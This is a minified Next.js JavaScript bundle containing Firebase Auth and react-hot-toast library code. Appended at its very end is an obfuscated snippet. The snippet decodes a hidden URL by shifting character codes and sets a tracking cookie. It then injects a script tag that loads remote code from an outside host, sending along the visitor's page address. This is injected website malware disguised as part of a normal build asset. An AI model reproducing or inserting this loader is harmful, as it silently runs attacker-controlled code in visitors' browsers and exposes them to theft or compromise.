0:t.authEvent,e,"invalid-auth-event"),{status:n.onEvent(t.authEvent)?"ACK":"ERROR"})),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER),this.eventManagers[e._key()]={manager:n},this.iframes[e._key()]=t,n}_isIframeWebStorageSupported(e,t){this.iframes[e._key()].send(St,{type:St},(n=>{var r;let i=null===(r=null==n?void 0:n[0])||void 0===r?void 0:r[St];void 0!==i&&t(!!i),d(e,"internal-error")}),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER)}_originValidation(e){let t=e._key();return this.originValidationPromises[t]||(this.originValidationPromises[t]=mt(e)),this.originValidationPromises[t]}get _shouldInitProactively(){return re()||J()||ne()}};var At="@firebase/auth",Ct="0.22.0";
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Nt{constructor(e){this.auth=e,this.internalListeners=new Map}getUid(){var e;return this.assertAuthConfigured(),(null===(e=this.auth.currentUser)||void 0===e?void 0:e.uid)||null}async getToken(e){if(this.assertAuthConfigured(),await this.auth._initializationPromise,!this.auth.currentUser)return null;return{accessToken:await this.auth.currentUser.getIdToken(e)}}addAuthTokenListener(e){if(this.assertAuthConfigured(),this.internalListeners.has(e))return;let t=this.auth.onIdTokenChanged((t=>{e((null==t?void 0:t.stsTokenManager.accessToken)||null)}));this.internalListeners.set(e,t),this.updateProactiveRefresh()}removeAuthTokenListener(e){this.assertAuthConfigured();let t=this.internalListeners.get(e);t&&(this.internalListeners.delete(e),t(),this.updateProactiveRefresh())}assertAuthConfigured(){g(this.auth._initializationPromise,"dependent-sdk-initialized-before-auth")}updateProactiveRefresh(){this.internalListeners.size>0?this.auth._startProactiveRefresh():this.auth._stopProactiveRefresh()}}let Ot=(0,i.Pz)("authIdTokenMaxAge")||300,Dt=null;function Rt(e=(0,s.Mq)()){let t=(0,s.qX)(e,"auth");if(t.isInitialized())return t.getImmediate();let n=
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function(e,t){let n=(0,s.qX)(e,"auth");if(n.isInitialized()){let e=n.getImmediate(),r=n.getOptions();if((0,i.vZ)(r,null!=t?t:{}))return e;d(e,"already-initialized")}return n.initialize({options:t})}(e,{popupRedirectResolver:kt,persistence:[He,Re,xe]}),r=(0,i.Pz)("authTokenSyncURL");if(r){var a,o;let e=(e=>async t=>{let n=t&&await t.getIdTokenResult(),r=n&&((new Date).getTime()-Date.parse(n.issuedAtTime))/1e3;if(r&&r>Ot)return;let i=null==n?void 0:n.token;Dt!==i&&(Dt=i,await fetch(e,{method:i?"POST":"DELETE",headers:i?{Authorization:`Bearer ${i}`}:{}}))})(r);a=()=>e(n.currentUser),(0,i.m9)(n).beforeAuthStateChanged(e,a),o=t=>e(t),(0,i.m9)(n).onIdTokenChanged(o,void 0,void 0)}let l=(0,i.q4)("auth");return l&&function(e,t,n){let r=oe(e);g(r._canInitEmulator,r,"emulator-config-failed"),g(/^https?:\/\//.test(t),r,"invalid-emulator-scheme");let i=ue(t),{host:s,port:a}=function(e){let t=ue(e),n=/(\/\/)?([^?#/]+)/.exec(e.substr(t.length));if(!n)return{host:"",port:null};let r=n[2].split("@").pop()||"",i=/^(\[[^\]]+\])(:|$)/.exec(r);if(i){let e=i[1];return{host:e,port:ce(r.substr(e.length+1))}}{let[e,t]=r.split(":");return{host:e,port:ce(t)}}}(t),o=null===a?"":`:${a}`;r.config.emulator={url:`${i}//${s}${o}/`},r.settings.appVerificationDisabledForTesting=!0,r.emulatorConfig=Object.freeze({host:s,port:a,protocol:i.replace(":",""),options:Object.freeze({disableWarnings:false})}),function(){function e(){let e=document.createElement("p"),t=e.style;e.innerText="Running in emulator mode. Do not use with production credentials.",t.position="fixed",t.width="100%",t.backgroundColor="#ffffff",t.border=".1em solid #000000",t.color="#b50000",t.bottom="0px",t.left="0px",t.margin="0px",t.zIndex="10000",t.textAlign="center",e.classList.add("firebase-emulator-warning"),document.body.appendChild(e)}"undefined"!=typeof console&&"function"==typeof console.info&&console.info("WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."),"undefined"!=typeof window&&"undefined"!=typeof document&&("loading"===document.readyState?window.addEventListener("DOMContentLoaded",e):e())}()}(n,`http://${l}`),n}r="Browser",(0,s.Xd)(new l.wA("auth",((e,{options:t})=>{let n=e.getProvider("app").getImmediate(),i=e.getProvider("heartbeat"),{apiKey:s,authDomain:a}=n.options;return((e,n)=>{g(s&&!s.includes(":"),"invalid-api-key",{appName:e.name}),g(!(null==a?void 0:a.includes(":")),"argument-error",{appName:e.name});let i={apiKey:s,authDomain:a,clientPlatform:r,apiHost:"identitytoolkit.googleapis.com",tokenApiHost:"securetoken.googleapis.com",apiScheme:"https",sdkClientVersion:ie(r)},o=new ae(e,n,i);return function(e,t){let n=(null==t?void 0:t.persistence)||[],r=(Array.isArray(n)?n:[n]).map(w);(null==t?void 0:t.errorMap)&&e._updateErrorMap(t.errorMap),e._initializeWithPersistence(r,null==t?void 0:t.popupRedirectResolver)}(o,t),o})(n,i)}),"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback(((e,t,n)=>{e.getProvider("auth-internal").initialize()}))),(0,s.Xd)(new l.wA("auth-internal",(e=>{let t=oe(e.getProvider("auth").getImmediate());return new Nt(t)}),"PRIVATE").setInstantiationMode("EXPLICIT")),(0,s.KN)(At,Ct,
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
void 0),(0,s.KN)(At,Ct,"esm2017")},6501:function(e,t,n){"use strict";let r,i;n.d(t,{x7:function(){return Y},ZP:function(){return Z},Am:function(){return P}});var s,a=n(7294);let o={data:""},l=e=>"object"==typeof window?((e?e.querySelector("#_goober"):window._goober)||Object.assign((e||document.head).appendChild(document.createElement("style")),{innerHTML:" ",id:"_goober"})).firstChild:e||o,u=/(?:([\u0080-\uFFFF\w-%@]+) *:? *([^{;]+?);|([^;}{]*?) *{)|(}\s*)/g,c=/\/\*[^]*?\*\/|  +/g,h=/\n+/g,d=(e,t)=>{let n="",r="",i="";for(let s in e){let a=e[s];"@"==s[0]?"i"==s[1]?n=s+" "+a+";":r+="f"==s[1]?d(a,s):s+"{"+d(a,"k"==s[1]?"":t)+"}":"object"==typeof a?r+=d(a,t?t.replace(/([^,])+/g,(e=>s.replace(/(^:.*)|([^,])+/g,(t=>/&/.test(t)?t.replace(/&/g,e):e?e+" "+t:t)))):s):null!=a&&(s=/^--/.test(s)?s:s.replace(/[A-Z]/g,"-$&").toLowerCase(),i+=d.p?d.p(s,a):s+":"+a+";")}return n+(t&&i?t+"{"+i+"}":i)+r},f={},p=e=>{if("object"==typeof e){let t="";for(let n in e)t+=n+p(e[n]);return t}return e},m=(e,t,n,r,i)=>{var s,a;let o=p(e),l=f[o]||(f[o]=(e=>{let t=0,n=11;for(;t<e.length;)n=101*n+e.charCodeAt(t++)>>>0;return"go"+n})(o));if(!f[l]){let t=o!==e?e:(e=>{let t,n,r=[{}];for(;t=u.exec(e.replace(c,""));)t[4]?r.shift():t[3]?(n=t[3].replace(h," ").trim(),r.unshift(r[0][n]=r[0][n]||{})):r[0][t[1]]=t[2].replace(h," ").trim();return r[0]})(e);f[l]=d(i?{["@keyframes "+l]:t}:t,n?"":"."+l)}let m=n&&f.g?f.g:null;return n&&(f.g=f[l]),s=f[l],a=t,m?a.data=a.data.replace(m,s):-1===a.data.indexOf(s)&&(a.data=r?s+a.data:a.data+s),l},g=(e,t,n)=>e.reduce(((e,r,i)=>{let s=t[i];if(s&&s.call){let e=s(n),t=e&&e.props&&e.props.className||/^go/.test(e)&&e;s=t?"."+t:e&&"object"==typeof e?e.props?"":d(e,""):!1===e?"":e}return e+r+(null==s?"":s)}),"");function y(e){let t=this||{},n=e.call?e(t.p):e;return m(n.unshift?n.raw?g(n,[].slice.call(arguments,1),t.p):n.reduce(((e,n)=>Object.assign(e,n&&n.call?n(t.p):n)),{}):n,l(t.target),t.g,t.o,t.k)}y.bind({g:1});let v,w,b,_=y.bind({k:1});function I(e,t){let n=this||{};return function(){let r=arguments;function i(s,a){let o=Object.assign({},s),l=o.className||i.className;n.p=Object.assign({theme:w&&w()},o),n.o=/ *go\d+/.test(l),o.className=y.apply(n,r)+(l?" "+l:""),t&&(o.ref=a);let u=e;return e[0]&&(u=o.as||e,delete o.as),b&&u[0]&&b(o),v(u,o)}return t?t(i):i}}var E=(e,t)=>(e=>"function"==typeof e)(e)?e(t):e,T=(r=0,()=>(++r).toString()),S=()=>{if(void 0===i&&"u">typeof window){let e=matchMedia("(prefers-reduced-motion: reduce)");i=!e||e.matches}return i},k=new Map,A=e=>{if(k.has(e))return;let t=setTimeout((()=>{k.delete(e),D({type:4,toastId:e})}),1e3);k.set(e,t)},C=(e,t)=>{switch(t.type){case 0:return{...e,toasts:[t.toast,...e.toasts].slice(0,20)};case 1:return t.toast.id&&(e=>{let t=k.get(e);t&&clearTimeout(t)})(t.toast.id),{...e,toasts:e.toasts.map((e=>e.id===t.toast.id?{...e,...t.toast}:e))};case 2:let{toast:n}=t;return e.toasts.find((e=>e.id===n.id))?C(e,{type:1,toast:n}):C(e,{type:0,toast:n});case 3:let{toastId:r}=t;return r?A(r):e.toasts.forEach((e=>{A(e.id)})),{...e,toasts:e.toasts.map((e=>e.id===r||void 0===r?{...e,visible:!1}:e))};case 4:return void 0===t.toastId?{...e,toasts:[]}:{...e,toasts:e.toasts.filter((e=>e.id!==t.toastId))};case 5:return{...e,pausedAt:t.time};case 6:let i=t.time-(e.pausedAt||0);return{...e,pausedAt:void 0,toasts:e.toasts.map((e=>({...e,pauseDuration:e.pauseDuration+i})))}}},N=[],O={toasts:[],pausedAt:void 0},D=e=>{O=C(O,e),N.forEach((e=>{e(O)}))},R={blank:4e3,error:4e3,success:2e3,loading:1/0,custom:4e3},x=e=>(t,n)=>{let r=((e,t="blank",n)=>({createdAt:Date.now(),visible:!0,type:t,ariaProps:{role:"status","aria-live":"polite"},message:e,pauseDuration:0,...n,id:(null==n?void 0:n.id)||T()}))(t,e,n);return D({type:2,toast:r}),r.id},P=(e,t)=>x("blank")(e,t);P.error=x("error"),P.success=x("success"),P.loading=x("loading"),P.custom=x("custom"),P.dismiss=e=>{D({type:3,toastId:e})},P.remove=e=>D({type:4,toastId:e}),P.promise=(e,t,n)=>{let r=P.loading(t.loading,{...n,...null==n?void 0:n.loading});return e.then((e=>(P.success(E(t.success,e),{id:r,...n,...null==n?void 0:n.success}),e))).catch((e=>{P.error(E(t.error,e),{id:r,...n,...null==n?void 0:n.error})})),e};var L=(e,t)=>{D({type:1,toast:{id:e,height:t}})},M=()=>{D({type:5,time:Date.now()})},F=e=>{let{toasts:t,pausedAt:n}=((e={})=>{let[t,n]=(0,a.useState)(O);(0,a.useEffect)((()=>(N.push(n),()=>{let e=N.indexOf(n);e>-1&&N.splice(e,1)})),[t]);let r=t.toasts.map((t=>{var n,r;return{...e,...e[t.type],...t,duration:t.duration||(null==(n=e[t.type])?void 0:n.duration)||(null==e?void 0:e.duration)||R[t.type],style:{...e.style,...null==(r=e[t.type])?void 0:r.style,...t.style}}}));return{...t,toasts:r}})(e);(0,a.useEffect)((()=>{if(n)return;let e=Date.now(),r=t.map((t=>{if(t.duration===1/0)return;let n=(t.duration||0)+t.pauseDuration-(e-t.createdAt);if(!(n<0))return setTimeout((()=>P.dismiss(t.id)),n);t.visible&&P.dismiss(t.id)}));return()=>{r.forEach((e=>e&&clearTimeout(e)))}}),[t,n]);let r=(0,a.useCallback)((()=>{n&&D({type:6,time:Date.now()})}),[n]),i=(0,a.useCallback)(((e,n)=>{let{reverseOrder:r=!1,gutter:i=8,defaultPosition:s}=n||{},a=t.filter((t=>(t.position||s)===(e.position||s)&&t.height)),o=a.findIndex((t=>t.id===e.id)),l=a.filter(((e,t)=>t<o&&e.visible)).length;return a.filter((e=>e.visible)).slice(...r?[l+1]:[0,l]).reduce(((e,t)=>e+(t.height||0)+i),0)}),[t]);return{toasts:t,handlers:{updateHeight:L,startPause:M,endPause:r,calculateOffset:i}}},U=I("div")`
  width: 20px;
  opacity: 0;
  height: 20px;
  border-radius: 10px;
  background: ${e=>e.primary||"#ff4b4b"};
  position: relative;
  transform: rotate(45deg);

  animation: ${_`
from {
  transform: scale(0) rotate(45deg);
	opacity: 0;
}
to {
 transform: scale(1) rotate(45deg);
  opacity: 1;
}`} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
  animation-delay: 100ms;

  &:after,
  &:before {
    content: '';
    animation: ${_`
from {
  transform: scale(0);
  opacity: 0;
}
to {
  transform: scale(1);
  opacity: 1;
}`} 0.15s ease-out forwards;
    animation-delay: 150ms;
    position: absolute;
    border-radius: 3px;
    opacity: 0;
    background: ${e=>e.secondary||"#fff"};
    bottom: 9px;
    left: 4px;
    height: 2px;
    width: 12px;
  }

  &:before {
    animation: ${_`
from {
  transform: scale(0) rotate(90deg);
	opacity: 0;
}
to {
  transform: scale(1) rotate(90deg);
	opacity: 1;
}`} 0.15s ease-out forwards;
    animation-delay: 180ms;
    transform: rotate(90deg);
  }
`,V=I("div")`
  width: 12px;
  height: 12px;
  box-sizing: border-box;
  border: 2px solid;
  border-radius: 100%;
  border-color: ${e=>e.secondary||"#e0e0e0"};
  border-right-color: ${e=>e.primary||"#616161"};
  animation: ${_`
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(360deg);
  }
`} 1s linear infinite;
`,j=I("div")`
  width: 20px;
  opacity: 0;
  height: 20px;
  border-radius: 10px;
  background: ${e=>e.primary||"#61d345"};
  position: relative;
  transform: rotate(45deg);

  animation: ${_`
from {
  transform: scale(0) rotate(45deg);
	opacity: 0;
}
to {
  transform: scale(1) rotate(45deg);
	opacity: 1;
}`} 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
  animation-delay: 100ms;
  &:after {
    content: '';
    box-sizing: border-box;
    animation: ${_`
0% {
	height: 0;
	width: 0;
	opacity: 0;
}
40% {
  height: 0;
	width: 6px;
	opacity: 1;
}
100% {
  opacity: 1;
  height: 10px;
}`} 0.2s ease-out forwards;
    opacity: 0;
    animation-delay: 200ms;
    position: absolute;
    border-right: 2px solid;
    border-bottom: 2px solid;
    border-color: ${e=>e.secondary||"#fff"};
    bottom: 6px;
    left: 6px;
    height: 10px;
    width: 6px;
  }
`,B=I("div")`
  position: absolute;
`,q=I("div")`
  position: relative;
  display: flex;
  justify-content: center;
  align-items: center;
  min-width: 20px;
  min-height: 20px;
`,$=I("div")`
  position: relative;
  transform: scale(0.6);
  opacity: 0.4;
  min-width: 20px;
  animation: ${_`
from {
  transform: scale(0.6);
  opacity: 0.4;
}
to {
  transform: scale(1);
  opacity: 1;
}`} 0.3s 0.12s cubic-bezier(0.175, 0.885, 0.32, 1.275)
    forwards;
`,z=({toast:e})=>{let{icon:t,type:n,iconTheme:r}=e;return void 0!==t?"string"==typeof t?a.createElement($,null,t):t:"blank"===n?null:a.createElement(q,null,a.createElement(V,{...r}),"loading"!==n&&a.createElement(B,null,"error"===n?a.createElement(U,{...r}):a.createElement(j,{...r})))},G=e=>`\n0% {transform: translate3d(0,${-200*e}%,0) scale(.6); opacity:.5;}\n100% {transform: translate3d(0,0,0) scale(1); opacity:1;}\n`,K=e=>`\n0% {transform: translate3d(0,0,-1px) scale(1); opacity:1;}\n100% {transform: translate3d(0,${-150*e}%,-1px) scale(.6); opacity:0;}\n`,H=I("div")`
  display: flex;
  align-items: center;
  background: #fff;
  color: #363636;
  line-height: 1.3;
  will-change: transform;
  box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1), 0 3px 3px rgba(0, 0, 0, 0.05);
  max-width: 350px;
  pointer-events: auto;
  padding: 8px 10px;
  border-radius: 8px;
`,W=I("div")`
  display: flex;
  justify-content: center;
  margin: 4px 10px;
  color: inherit;
  flex: 1 1 auto;
  white-space: pre-line;
`,Q=a.memo((({toast:e,position:t,style:n,children:r})=>{let i=e.height?((e,t)=>{let n=e.includes("top")?1:-1,[r,i]=S()?["0%{opacity:0;} 100%{opacity:1;}","0%{opacity:1;} 100%{opacity:0;}"]:[G(n),K(n)];return{animation:t?`${_(r)} 0.35s cubic-bezier(.21,1.02,.73,1) forwards`:`${_(i)} 0.4s forwards cubic-bezier(.06,.71,.55,1)`}})(e.position||t||"top-center",e.visible):{opacity:0},s=a.createElement(z,{toast:e}),o=a.createElement(W,{...e.ariaProps},E(e.message,e));return a.createElement(H,{className:e.className,style:{...i,...n,...e.style}},"function"==typeof r?r({icon:s,message:o}):a.createElement(a.Fragment,null,s,o))}));s=a.createElement,d.p=void 0,v=s,w=void 0,b=void 0;var J=({id:e,className:t,style:n,onHeightUpdate:r,children:i})=>{let s=a.useCallback((t=>{if(t){let n=()=>{r(e,t.getBoundingClientRect().height)};n(),new MutationObserver(n).observe(t,{subtree:!0,childList:!0,characterData:!0})}}),[e,r]);return a.createElement("div",{ref:s,className:t,style:n},i)},X=y`
  z-index: 9999;
  > * {
    pointer-events: auto;
  }
`,Y=({reverseOrder:e,position:t="top-center",toastOptions:n,gutter:r,children:i,containerStyle:s,containerClassName:o})=>{let{toasts:l,handlers:u}=F(n);return a.createElement("div",{style:{position:"fixed",zIndex:9999,top:16,left:16,right:16,bottom:16,pointerEvents:"none",...s},className:o,onMouseEnter:u.startPause,onMouseLeave:u.endPause},l.map((n=>{let s=n.position||t,o=((e,t)=>{let n=e.includes("top"),r=e.includes("center")?{justifyContent:"center"}:e.includes("right")?{justifyContent:"flex-end"}:{};return{left:0,right:0,display:"flex",position:"absolute",transition:S()?void 0:"all 230ms cubic-bezier(.21,1.02,.73,1)",transform:`translateY(${t*(n?1:-1)}px)`,...n?{top:0}:{bottom:0},...r}})(s,u.calculateOffset(n,{reverseOrder:e,gutter:r,defaultPosition:t}));return a.createElement(J,{id:n.id,key:n.id,onHeightUpdate:u.updateHeight,className:n.visible?X:"",style:o},"custom"===n.type?E(n.message,n):i?i(n):a.createElement(Q,{toast:n,position:s}))})))},Z=P}},function(e){var t=function(t){return e(e.s=t)};e.O(0,[774,179],(function(){return t(6840),t(6885)})),_N_E=e.O()}]);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));